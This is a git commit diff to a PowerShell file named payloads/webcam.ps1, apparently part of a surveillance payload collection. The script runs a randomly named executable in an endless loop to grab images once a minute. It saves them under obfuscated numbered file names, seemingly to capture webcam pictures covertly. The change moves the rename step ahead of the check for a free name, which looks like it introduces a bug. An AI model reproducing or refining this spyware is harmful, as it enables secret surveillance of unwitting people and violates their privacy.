69955c928c6d8d60fce5512ee1b862025356a358
Blue Cosmo <bluecosmo@localhost.localdomain>
2022-02-10 22:50:55 -0500

    test9

--- payloads/webcam.ps1
+++ payloads/webcam.ps1
@@ -2,9 +2,9 @@ $xNaqfyEYmt = 0
 
 while ($true) {
     ./UaAIVKpYhR.exe
+    Move-Item -Path image.bmp -Destination "${xNaqfyEYmt}etslzobCVS.bmp"
     while (Test-Path "${xNaqfyEYmt}etslzobCVS.bmp") {
         $xNaqfyEYmt++
     }
-    Move-Item -Path image.bmp -Destination "${xNaqfyEYmt}etslzobCVS.bmp"
     Start-Sleep -Seconds 60
 }
